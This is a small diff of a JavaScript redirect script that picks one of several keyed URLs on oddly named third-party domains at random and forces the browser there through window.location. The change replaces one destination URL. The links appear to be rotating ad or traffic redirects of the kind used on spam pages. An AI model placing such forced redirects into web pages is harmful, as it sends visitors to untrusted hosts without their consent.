@@ -3,7 +3,7 @@ var dataUrl = [
 '//goshbiopsy.com/dug7h0p8?key=aae9ffd149babf83a81f2c0eab30300f',
 '//goshbiopsy.com/jgh102dr2?key=294998ba132dc55926b6299c93ebf70f',
 '//goshbiopsy.com/jbjxyg1z?key=4de9306964f4da59cc607f8c3b7a1be0',
-'//sergeantunhealthy.com/jdh7sy92?key=678ee6ec00a7dbcc74458748c5cbaa1f'
+'//goshbiopsy.com/yesucn64u?key=d3b2cba95843c8801b4168b6565e8b14'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
